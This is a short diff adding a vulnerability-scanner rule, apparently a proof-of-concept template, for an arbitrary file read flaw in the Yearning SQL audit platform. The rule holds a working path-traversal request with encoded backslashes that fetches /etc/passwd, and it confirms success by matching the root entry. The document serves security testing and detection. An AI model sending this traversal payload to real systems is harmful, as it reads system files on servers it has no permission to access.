@@ -1,0 +1,11 @@
+name: yearning-fileread
+rules:
+  - method: GET
+    path: "/front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"
+    expression: |
+      response.status == 200 && "root:.*:0:0:".bmatches(response.body)
+detail:
+  author: lxy
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  description: "Yearning SQL审核平台 任意文件读取漏洞"
